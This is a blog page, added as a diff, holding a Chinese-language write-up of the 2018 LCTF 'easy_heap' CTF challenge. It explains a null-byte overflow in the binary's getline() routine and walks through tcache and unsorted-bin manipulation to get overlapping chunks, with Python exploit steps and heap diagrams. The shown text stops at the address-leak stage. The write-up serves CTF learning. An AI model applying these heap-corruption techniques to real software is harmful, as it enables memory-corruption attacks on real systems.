@@ -1,0 +1,917 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Tcache,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="这两天开始看tcache的一些利用方式，边做题边理解。当malloc()时，申请的大小正好与unsorted bin中的chunk大小一致时，会被放入tcache。由于tcache只利用前8字节保存链表信息，因此从unsorted bin中被放入tcache的chunk的bk的值仍然被保留。利用堆块中残留的bk指针的信息，进行unlink攻击。  这里有两点需要注意放在前面： 1、off by">
+<meta name="keywords" content="Tcache">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2018_LCTF_easy_heap writeup">
+<meta property="og:url" content="https://v1ckydxp.github.io/archives/2019/07/01/2018_LCTF_easy_heap-writeup/index.html">
+<meta property="og:site_name" content="v1cky&#39;blog">
+<meta property="og:description" content="这两天开始看tcache的一些利用方式，边做题边理解。当malloc()时，申请的大小正好与unsorted bin中的chunk大小一致时，会被放入tcache。由于tcache只利用前8字节保存链表信息，因此从unsorted bin中被放入tcache的chunk的bk的值仍然被保留。利用堆块中残留的bk指针的信息，进行unlink攻击。  这里有两点需要注意放在前面： 1、off by">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-07-11T00:57:51.336Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2018_LCTF_easy_heap writeup">
+<meta name="twitter:description" content="这两天开始看tcache的一些利用方式，边做题边理解。当malloc()时，申请的大小正好与unsorted bin中的chunk大小一致时，会被放入tcache。由于tcache只利用前8字节保存链表信息，因此从unsorted bin中被放入tcache的chunk的bk的值仍然被保留。利用堆块中残留的bk指针的信息，进行unlink攻击。  这里有两点需要注意放在前面： 1、off by">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://v1ckydxp.github.io/archives/2019/07/01/2018_LCTF_easy_heap-writeup/">
+
+
+
+
+
+  <title>2018_LCTF_easy_heap writeup | v1cky'blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">v1cky'blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">few words,many deeds!</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://v1ckydxp.github.io/archives/2019/07/01/2018_LCTF_easy_heap-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="v1cky01dxp">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="v1cky'blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2018_LCTF_easy_heap writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-01T00:00:00+08:00">
+                2019-07-01
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Post modified&#58;</span>
+              
+              <time title="Post modified" itemprop="dateModified" datetime="2019-07-11T08:57:51+08:00">
+                2019-07-11
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/二进制/" itemprop="url" rel="index">
+                    <span itemprop="name">二进制</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  2.7k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  12
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p>这两天开始看tcache的一些利用方式，边做题边理解。当<code>malloc()</code>时，申请的大小正好与<code>unsorted bin</code>中的<code>chunk</code>大小一致时，会被放入<code>tcache</code>。由于<code>tcache</code>只利用前<code>8</code>字节保存链表信息，因此从<code>unsorted bin</code>中被放入<code>tcache</code>的<code>chunk</code>的<code>bk</code>的值仍然被保留。利用堆块中残留的<code>bk</code>指针的信息，进行<code>unlink</code>攻击。</p>
+</blockquote>
+<p>这里有两点需要注意放在前面：</p>
+<p>1、<code>off by one</code>可以覆盖<code>inuse</code>位：必须在进行了重用的情况下才能实现！</p>
+<p>2、泄露堆地址时，加减的偏移量应取多少，需要考虑是否有重用！</p>
+<blockquote>
+<p><code>chunk</code>的<code>fd</code>指针和<code>bk</code>指针一直分不清，<code>fd</code>指针应该是指向该<code>chunk</code>的低地址的<code>chunk</code>，而<code>bk</code>指针是指向高地址的<code>chunk</code>。因为由当前<code>chunk</code>求下一个<code>chunk</code>的地址是当前<code>chunk</code>的地址加上当前<code>chunk</code>的<code>size</code>来得到的；而求前一个<code>chunk</code>的地址是由当前<code>chunk</code>的地址减去<code>prev_size</code>得到的。</p>
+</blockquote>
+<h3 id="程序基本信息"><a href="#程序基本信息" class="headerlink" title="程序基本信息"></a>程序基本信息</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@5e61fcc8a838:/home/docker/pwnable/2018_LCTF_easy_heap<span class="comment"># file easy_heap.dms</span></span><br><span class="line">easy_heap.dms: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=a94f7ec039023e90d619f61acca68dd0863486c4, stripped</span><br><span class="line">root@5e61fcc8a838:/home/docker/pwnable/2018_LCTF_easy_heap<span class="comment"># checksec easy_heap.dms</span></span><br><span class="line">[*] <span class="string">'/home/docker/pwnable/2018_LCTF_easy_heap/easy_heap.dms'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>这道题的<code>libc</code>版本是<code>2.27</code>，所以在堆块申请释放的时候考虑<code>Tcache</code>，程序的所有的安全保护机制默认开启。</p>
+</blockquote>
+<h3 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h3><p>​    程序逻辑功能很简单，malloc/free/puts/exit。</p>
+<ol>
+<li>malloc：根据输入的size，读取指定长度的内容，长度不能超过0xf8。</li>
+<li>Free：常规内存释放，free之后有将指针置为0.</li>
+<li>puts：输出知道索引的内容。</li>
+<li>exit：程序退出。</li>
+</ol>
+<h4 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct node&#123;</span><br><span class="line">	char *content_ptr;</span><br><span class="line">	int size;</span><br><span class="line">&#125;content_chunk[10];</span><br></pre></td></tr></table></figure>
+<p>又一个结构体数组，每一个结构体包含一个指向<code>content</code>的指针和表示<code>content</code>长度的<code>size</code>变量。</p>
+<h4 id="getline-函数"><a href="#getline-函数" class="headerlink" title="getline()函数"></a>getline()函数</h4><p>程序中有一个自己实现的<code>getline()</code>函数，但这个存在一个<code>null-bute-overflow</code>的漏洞。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">getline</span><span class="params">(_BYTE *ptr, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> index; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  index = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      read(<span class="number">0</span>, &amp;ptr[index], <span class="number">1u</span>LL);</span><br><span class="line">      <span class="keyword">if</span> ( size - <span class="number">1</span> &lt; index || !ptr[index] || ptr[index] == <span class="string">'\n'</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      ++index;</span><br><span class="line">    &#125;</span><br><span class="line">    ptr[index] = <span class="number">0</span>;</span><br><span class="line">    ptr[size] = <span class="number">0</span>;<span class="comment">//存在一个字节的溢出，造成null-byte-overflow</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *ptr = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>size - 1 &lt; index</code>这里条件不满足退出循环之后，<code>ptr[size] = 0;</code>这步操作会导致一个byte的null溢出。</p>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>​    由于上面getline()函数每次只读取一个字节，并且该字节不能为0，所以常规的null-byte-overflow的方法行不通。常规的null-byte-overflow的利用思路是通过溢出覆盖prev_inuse字节来使得堆块合并，然后用伪造的prev_size字节使得和fake chunk进行unlink。但是这里不能通过输入0x00的值，所以prev_size无法通过溢出修改。</p>
+<p>​    在无法使用手动修改prev_size的情况下，考虑使用系统写入prev_siz。因为unsorted bin在进合并的时候会写入prev_size，所以可以利用该prev_size利用。在libc 2.27中，加入了Tcache内存管理机制，这里固定分配堆块大小为0xF8，符合Tcache的大小限制，所以在释放该堆块时会首先放入Tcache结构体中，直到达到上限7。这里content_chunk数组的数量为10，我们可以先Tcache填满，之后释放的就会放入unsorted bin中。同样的，要拿出unsorted bin中的堆块，也要先malloc7次把Tcache清空才可以。</p>
+<p><strong>PS：</strong>根据堆块重用的规则，这里申请分配的堆块大小为0xf8，对齐之后实际大小为0x100，比原来多了8字节，由于在64位程序中，8字节大于等于16字节的一半，所以会采用堆块重用，0xf8的最后8字节会在下一个chunk的prev_size域，加起来刚好0x100。</p>
+<p><strong>总结一下堆块重用条件：</strong>申请的内存大小在按照上述规则进行向大取整后，得到的应有大小比原大小大出的值&gt;=对齐字节量的一半（presize字段长度）.    =&gt;也即：申请的内存大小mod对齐字节量&lt;=对齐字节量的一半（presize字段长度）.</p>
+<p><strong>Tcache转移机制：</strong>当用户申请一个堆块的时候，如果tcache已经为空，而fastbin/smallbin/unsorted bin中有size符合的chunk时，会先把fastbin/smallbin/unsorted bin中的chunk全部转移到tcache中直到填满，然后再从tcache中拿；</p>
+<p><strong>注意：</strong>unsorted bin合并时，合并后的堆块不会进tcache，在从一个大的unsorted bin chunk分割出chunk的情形下，分出来的和剩下的都不会进tcache！在进行unsorted bin合并时，会把合并后的堆块的大小写如下一个chunk的prev_size域。利用这个可以实现chunk overlapping。</p>
+<p>####具体过程为：</p>
+<ol>
+<li>将 <code>A -&gt; B -&gt; C</code> 三块 unsorted bin chunk 依次进行释放</li>
+<li>A 和 B 合并，此时 C 前的 prev_size 写入为 0x200。</li>
+<li>A 、 B 、 C 合并，步骤 2 中写入的 0x200 依然保持。</li>
+<li>利用 unsorted bin 切分，分配出 A 。</li>
+<li>利用 unsorted bin 切分，分配出 B(B被分配两次，就有两个指针都指向这个位置)，注意此时不要覆盖到之前的 0x200。</li>
+<li>将 A 再次释放为 unsorted bin 的堆块，使得 fd 和 bk 为有效链表指针。</li>
+<li>此时 C 前的 prev_size 依然为 0x200（未使用到的值），A B C 的情况： <code>A (free) -&gt; B (allocated) -&gt; C (free)</code>，如果使得 B 进行溢出，则可以将已分配的 B 块包含在合并后的释放状态 unsorted bin 块中。</li>
+</ol>
+<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><h4 id="1-得到A、B、C三个Unsorted-Bin-chunk"><a href="#1-得到A、B、C三个Unsorted-Bin-chunk" class="headerlink" title="1. 得到A、B、C三个Unsorted Bin chunk"></a>1. 得到A、B、C三个Unsorted Bin chunk</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#首先分配7个堆块用于之后把tcache沾满</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span>  range(<span class="number">7</span>):</span><br><span class="line">  malloc(<span class="number">0x10</span>,str(i)+<span class="string">'bbbb'</span>)</span><br><span class="line"><span class="comment">#分配三个堆块用于之后free到unsorted bin中</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">  malloc(<span class="number">0x10</span>,str(i+<span class="number">7</span>)+<span class="string">'aaaa'</span>)</span><br><span class="line"><span class="comment">#先释放6个堆块到tcache中</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">  free(i)</span><br><span class="line"><span class="comment">#释放chunk9用于将unsorted bin和topchunk隔开，防止合并，该chunk9会被放到tcache中</span></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="comment">#最后释放中间的三个chunk被放到unsorted bin 中</span></span><br><span class="line"><span class="comment">#free(6) ==&gt; prev_size = 0x100</span></span><br><span class="line"><span class="comment">#free(7) ==&gt; prev_size = 0x200</span></span><br><span class="line"><span class="comment">#free(8) ==&gt; prev_size = 0x300</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>,<span class="number">9</span>):</span><br><span class="line">	free(i)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">合并 Chunk A:</span><br><span class="line">+---------------+</span><br><span class="line">|  size: 0x100  | -&gt; unosrted bin大小（A）</span><br><span class="line">+---------------+</span><br><span class="line">|     fd/bk     |</span><br><span class="line">+---------------+</span><br><span class="line">|               |</span><br><span class="line">|               |</span><br><span class="line">|               |</span><br><span class="line">+---------------+</span><br><span class="line">|prev size:0x100| -&gt; 写入的prev_size</span><br><span class="line">+---------------+</span><br><span class="line">合并Chunk B到unsorted bins:</span><br><span class="line">+---------------+</span><br><span class="line">|  size: 0x200  | -&gt; 被合并过的unsorted bin大小(原来的A指向的地方)</span><br><span class="line">+---------------+</span><br><span class="line">|     fd/bk     |</span><br><span class="line">+---------------+</span><br><span class="line">|               |</span><br><span class="line">|               |</span><br><span class="line">|               |</span><br><span class="line">+---------------+</span><br><span class="line">|prev size:0x100| -&gt; 原来的prev_size会保持在这里(原来的B指向的地方)</span><br><span class="line">+---------------+</span><br><span class="line">|  size: 0x100  |</span><br><span class="line">+---------------+</span><br><span class="line">|               |</span><br><span class="line">|               |</span><br><span class="line">|               |</span><br><span class="line">|               |</span><br><span class="line">+---------------+</span><br><span class="line">|prev size:0x200| -&gt; 新的prev_size</span><br><span class="line">+---------------+</span><br><span class="line"> </span><br><span class="line">unsorted bin现在的大小是0x200, 然后添加 Chunk C</span><br><span class="line">+---------------+</span><br><span class="line">|  size: 0x300  | -&gt; unosrted bin大小（原来的A）</span><br><span class="line">+---------------+</span><br><span class="line">|     fd/bk     |</span><br><span class="line">+---------------+</span><br><span class="line">|       A        |</span><br><span class="line">|               |</span><br><span class="line">|               |</span><br><span class="line">+---------------+</span><br><span class="line">|prev size:0x100|</span><br><span class="line">+---------------+</span><br><span class="line">|  size: 0x100  |</span><br><span class="line">+---------------+</span><br><span class="line">|               |</span><br><span class="line">|       B        |</span><br><span class="line">|               |</span><br><span class="line">|               |</span><br><span class="line">+---------------+</span><br><span class="line">|prev size:0x200| -&gt; 0x200，刚刚好可以用来overlap!（C的prev_size 被改写）</span><br><span class="line">+---------------+</span><br><span class="line">|  size: 0x100  |</span><br><span class="line">+---------------+</span><br><span class="line">|               |</span><br><span class="line">|               |</span><br><span class="line">|         C      |</span><br><span class="line">|               |</span><br><span class="line">+---------------+</span><br><span class="line">|prev size:0x300| -&gt; 最终的size</span><br><span class="line">+---------------+</span><br></pre></td></tr></table></figure>
+<p>此时的堆结构：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">+-----+</span><br><span class="line">|     | &lt;-- tcache perthread 结构体</span><br><span class="line">+-----+</span><br><span class="line">| ... | &lt;-- 6 个 tcache 块</span><br><span class="line">+-----+</span><br><span class="line">|  A  | &lt;-- 3 个 unsorted bin 块</span><br><span class="line">+-----+</span><br><span class="line">|  B  |</span><br><span class="line">+-----+</span><br><span class="line">|  C  |</span><br><span class="line">+-----+</span><br><span class="line">|     | &lt;-- tcache 块，防止 top 合并</span><br><span class="line">+-----+</span><br><span class="line">| top |</span><br><span class="line">|  .. |</span><br></pre></td></tr></table></figure>
+<h4 id="2-将chunk-B放入Tcache"><a href="#2-将chunk-B放入Tcache" class="headerlink" title="2. 将chunk B放入Tcache"></a>2. 将chunk B放入Tcache</h4><blockquote>
+<p>这一步卡了好久，好想打人，我一直以为这个索引值是不变的，所以在第一步A,B,C对应的编号是6,7,8。我以为下一次还是，卡了一整个下午，搞得晚上完全不想学习。</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#要将B放入tcache中，首先要清空tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>): <span class="comment">#这里会导致序号重排列，和上一步的序号不同，在上一步中A，B，C的序号对应为6，7，8</span></span><br><span class="line">  malloc(<span class="number">0x10</span>,<span class="string">'bbbb'</span>)</span><br><span class="line"><span class="comment">#将unsorted bin中的chunk分配出去</span></span><br><span class="line">malloc(<span class="number">0x10</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">malloc(<span class="number">0x10</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">malloc(<span class="number">0x10</span>,<span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">  free(i)</span><br><span class="line"><span class="comment">#释放B即8到tcache</span></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#然后释放A</span></span><br><span class="line">free(<span class="number">7</span>)</span><br></pre></td></tr></table></figure>
+<p>此时的堆块结构：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">+-----+</span><br><span class="line">|     | &lt;-- tcache perthread 结构体</span><br><span class="line">+-----+</span><br><span class="line">| ... | &lt;-- 6 个 tcache 块 (free)序号为0-5</span><br><span class="line">+-----+</span><br><span class="line">|  A  | &lt;-- free 序号为7</span><br><span class="line">+-----+</span><br><span class="line">|  B  | &lt;-- free 且为 tcache 块 序号为8</span><br><span class="line">+-----+</span><br><span class="line">|  C  | 序号为9</span><br><span class="line">+-----+</span><br><span class="line">|     | &lt;-- tcache 块，防止 top 合并 序号为6</span><br><span class="line">+-----+</span><br><span class="line">| top |</span><br><span class="line">|  .. |</span><br></pre></td></tr></table></figure>
+<h4 id="3-null字符溢出，触发合并"><a href="#3-null字符溢出，触发合并" class="headerlink" title="3. null字符溢出，触发合并"></a>3. null字符溢出，触发合并</h4><p>上面的步骤结束后，tcache bin链表中，第一块是B，unsorted bin中为A-&gt;C。现在分配B，并且进行null字符溢出。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc(<span class="number">0xf8</span>,<span class="string">'null overflow'</span>)</span><br></pre></td></tr></table></figure>
+<p>此时A，B，C的状态分别为释放，分配，释放。由于此时位于tcache中的B被分配。需要将与top chunk近邻的chunk释放掉，将tcache沾满。然后释放C会触发合并。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br></pre></td></tr></table></figure>
+<h4 id="4-泄漏地址"><a href="#4-泄漏地址" class="headerlink" title="4. 泄漏地址"></a>4. 泄漏地址</h4><p>此时堆块已经出现了交叉，ABC合并成了一个大的0x300的堆块。接下来需要将A从unsorted bin中分配出来，需要先把tcache清空。</p>
